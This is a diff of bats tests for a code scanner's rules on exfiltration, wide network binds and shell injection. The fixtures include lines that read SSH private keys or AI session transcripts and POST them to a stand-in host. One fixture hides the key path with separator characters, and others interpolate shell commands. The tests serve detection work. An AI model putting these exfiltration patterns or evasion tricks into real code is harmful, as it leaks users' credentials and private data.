@@ -316,3 +316,86 @@ rules_in() { scan | jq -r '[.findings[].rule] | unique | join(",")'; }
   run timeout 20 python3 -I "$T" "$D"
   [ "$status" -ne 124 ]
 }
+
+@test "VS007 flags a file that reads ssh keys and posts out" {
+  put steal.py $'import requests, os\nk = open(os.path.expanduser("~/.ssh/id_rsa")).read()\nrequests.post("https://c.example.invalid", data=k)'
+  run rules_in; [[ "$output" == *VS007* ]] || false
+}
+@test "VS007 flags a session-transcript upload" {
+  put sync.js $'const t = fs.readFileSync(home + "/.claude/projects/x.jsonl");\nfetch("https://c.example.invalid", {method:"POST", body:t})'
+  run rules_in; [[ "$output" == *VS007* ]] || false
+}
+@test "VS007 stays quiet on a file that only calls its own API with a key from the environment" {
+  put api.py $'import requests, os\nk = os.environ.get("MY_API_KEY")\nrequests.post("https://api.example.invalid", headers={"x": k})'
+  run rules_in; [[ "$output" != *VS007* ]] || false
+}
+@test "VS007 still reports when separators hide the sensitive path from every single line" {
+  printf 'import requests\nk = "~/.ssh\x0b/id"\nrequests.post("https://c.example.invalid", data=k)\n' > "$D/a.py"
+  printf 'x = os.environ\nrequests.put(u)\n' > "$D/b.py"
+  run scan
+  [ "$(echo "$output" | jq -r '[.findings[] | select(.rule=="VS007")] | length')" -ge 1 ]
+}
+@test "VS007 floor is block" {
+  put steal.py $'k = open("~/.ssh/id_rsa").read()\nrequests.post(u, data=k)'
+  run scan
+  [ "$(echo "$output" | jq -r '.floor')" = "block" ]
+}
+@test "VS008 flags a wide bind, and marks it higher when no auth word is in the file" {
+  put srv.py 'app.run(host="0.0.0.0", port=8888)'
+  run scan
+  [ "$(echo "$output" | jq -r '.findings[] | select(.rule=="VS008") | .severity')" = "high" ]
+  put srv.py $'API_TOKEN = load()\napp.run(host="0.0.0.0", port=8888)'
+  run scan
+  [ "$(echo "$output" | jq -r '.findings[] | select(.rule=="VS008") | .severity')" = "medium" ]
+}
+@test "VS008 stays quiet on a loopback bind" {
+  put srv.py 'app.run(host="127.0.0.1", port=8888)'
+  put v6.py 'app.run(host="::1", port=8888)'
+  run rules_in; [ "$output" = "" ]
+}
+@test "VS008 flags the IPv6 wildcard and listen and bind forms" {
+  put a.py 'app.run(host="::", port=1)'
+  put b.js 'server.listen("0.0.0.0")'
+  put c.py 's.bind(("0.0.0.0", 80))'
+  run scan
+  [ "$(echo "$output" | jq -r '[.findings[] | select(.rule=="VS008") | .path] | sort | join(",")')" = "a.py,b.js,c.py" ]
+}
+@test "VS008 floor is caution" {
+  put srv.py 'app.run(host="0.0.0.0")'
+  run scan
+  [ "$(echo "$output" | jq -r '.floor')" = "caution" ]
+}
+@test "VS009 flags shell=True and os.system with an interpolated command" {
+  put run.py $'subprocess.run(f"nmap {target}", shell=True)\nos.system("ls " + path)'
+  run scan
+  [ "$(echo "$output" | jq -r '[.findings[] | select(.rule=="VS009")] | length')" = "2" ]
+}
+@test "VS009 stays quiet on a fixed argument list" {
+  put run.py 'subprocess.run(["git", "status"], check=True)'
+  run rules_in; [ "$output" = "" ]
+}
+@test "VS009 stays quiet on os.system with a fixed command, flags popen and eval" {
+  put a.py 'os.system("clear")'
+  put b.js 'child_process.exec("ls")'
+  run rules_in; [ "$output" = "" ]
+  put c.py 'os.popen("ls")'
+  put d.py 'eval(x)'
+  put e.js 'child_process.exec(`ls ${dir}`)'
+  run scan
+  [ "$(echo "$output" | jq -r '[.findings[] | select(.rule=="VS009") | .path] | sort | join(",")')" = "c.py,d.py,e.js" ]
+}
+@test "VS009 floor is caution" {
+  put run.py 'subprocess.run(cmd, shell=True)'
+  run scan
+  [ "$(echo "$output" | jq -r '.floor')" = "caution" ]
+}
+@test "machine rules finish fast on adversarial long lines and a 1 MB single line" {
+  { for i in $(seq 800); do printf 'curl '; done; } > "$D/a.sh"
+  { printf 'host'; head -c 4000 /dev/zero | tr '\0' ' '; } > "$D/b.py"
+  { for i in $(seq 600); do printf 'host=  '; done; } > "$D/c.py"
+  { for i in $(seq 200000); do printf 'curl '; done; } > "$D/big.sh"
+  { head -c 1000000 /dev/zero | tr '\0' ' '; printf '.env'; } > "$D/big2.txt"
+  { for i in $(seq 700); do printf 'os.system('; done; } > "$D/d.py"
+  run timeout 30 python3 -I "$T" "$D"
+  [ "$status" -ne 124 ]
+}
